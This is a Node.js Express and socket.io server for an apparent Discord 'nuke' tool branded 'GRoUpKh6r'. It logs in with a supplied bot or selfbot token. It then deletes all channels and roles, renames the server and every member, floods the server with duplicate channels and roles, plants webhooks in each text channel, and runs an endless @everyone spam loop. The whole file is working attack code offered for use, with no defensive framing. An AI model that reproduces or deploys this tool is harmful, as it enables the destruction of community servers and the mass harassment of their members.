// language: JavaScript, file: server.js, target: Node.js / Web Hosting
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Client: SelfClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, Intents } = require('discord.js');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

const activeSpammers = new Map();

function createDiscordClient(tokenType) {
    if (tokenType === 'bot') {
        return new BotClient({
            intents: [
                Intents.FLAGS.GUILDS,
                Intents.FLAGS.GUILD_MESSAGES,
                Intents.FLAGS.GUILD_MEMBERS
            ]
        });
    } else {
        return new SelfClient();
    }
}

io.on('connection', (socket) => {
    
    socket.on('execute_action', async (data) => {
        const { tokenType, token, guildId, action, customName, spamText } = data;
        const client = createDiscordClient(tokenType);

        try {
            await client.login(token);
            const guild = await client.guilds.fetch(guildId);

            if (action === 'nuke_all') {
                socket.emit('status', { msg: '[*] Starting total nuke protocol...' });
                
                const channels = await guild.channels.fetch();
                channels.forEach(async c => { await c?.delete().catch(() => {}); });
                
                const roles = await guild.roles.fetch();
                roles.forEach(async r => { if (r.editable && r.id !== guild.id) await r.delete().catch(() => {}); });

                await guild.setName(customName || 'GRoUpKh6r').catch(() => {});
                
                const members = await guild.members.fetch();
                members.forEach(async m => { await m.setNickname(customName || 'GRoUpKh6r').catch(() => {}); });

                socket.emit('status', { msg: '[+] Total nuke executed successfully.' });
            }
            else if (action === 'create_channels') {
                socket.emit('status', { msg: '[*] Creating channels...' });
                const baseName = customName || 'gr0upkh6r';
                const promises = [];
                for (let i = 1; i <= 35; i++) {
                    promises.push(guild.channels.create(`${baseName}`, { type: 'GUILD_TEXT' }).catch(() => {}));
                }
                await Promise.all(promises);
                socket.emit('status', { msg: '[+] Channels created.' });
            }
            else if (action === 'create_roles') {
                socket.emit('status', { msg: '[*] Creating roles...' });
                const baseName = customName || 'GRoUpKh6r';
                const promises = [];
                for (let i = 1; i <= 30; i++) {
                    promises.push(guild.roles.create({ name: `${baseName}`, color: 'RANDOM' }).catch(() => {}));
                }
                await Promise.all(promises);
                socket.emit('status', { msg: '[+] Roles created.' });
            }
            else if (action === 'create_webhooks') {
                socket.emit('status', { msg: '[*] Creating webhooks across channels...' });
                const channels = await guild.channels.fetch();
                const webhookUrls = [];
                
                for (const [id, channel] of channels) {
                    if (channel.type === 'GUILD_TEXT' || channel.type === 0) {
                        try {
                            const wh = await channel.createWebhook('GRoUpKh6r-Hook');
                            webhookUrls.push(wh.url);
                        } catch (e) {}
                    }
                }
                
                activeSpammers.set(socket.id, webhookUrls);
                socket.emit('status', { msg: `[+] Created ${webhookUrls.length} webhooks.` });
            }
            else if (action === 'webhook_spam') {
                const webhooks = activeSpammers.get(socket.id);
                if (!webhooks || webhooks.length === 0) {
                    socket.emit('status', { msg: '[!] Error: Create webhooks first!' });
                    return;
                }
                
                socket.emit('status', { msg: '[*] Infinite Webhook spam initiated...' });
                const spamPayload = { content: spamText || '@everyone GRoUpKh6r#91 ON TOP' };
                
                const spamLoop = async () => {
                    while (activeSpammers.has(socket.id)) {
                        const promises = webhooks.map(url => axios.post(url, spamPayload).catch(() => {}));
                        await Promise.all(promises);
                        await new Promise(r => setTimeout(r, 50));
                    }
                };
                
                spamLoop();
            }
            else if (action === 'stop_spam') {
                activeSpammers.delete(socket.id);
                socket.emit('status', { msg: '[!] Spam halted.' });
            }

            client.destroy();
        } catch (err) {
            socket.emit('status', { msg: `[!] Error: ${err.message}` });
        }
    });

    socket.on('disconnect', () => {
        activeSpammers.delete(socket.id);
    });
});

server.listen(process.env.PORT || 8080, () => {
    console.log('GRoUpKh6r Server active');
});
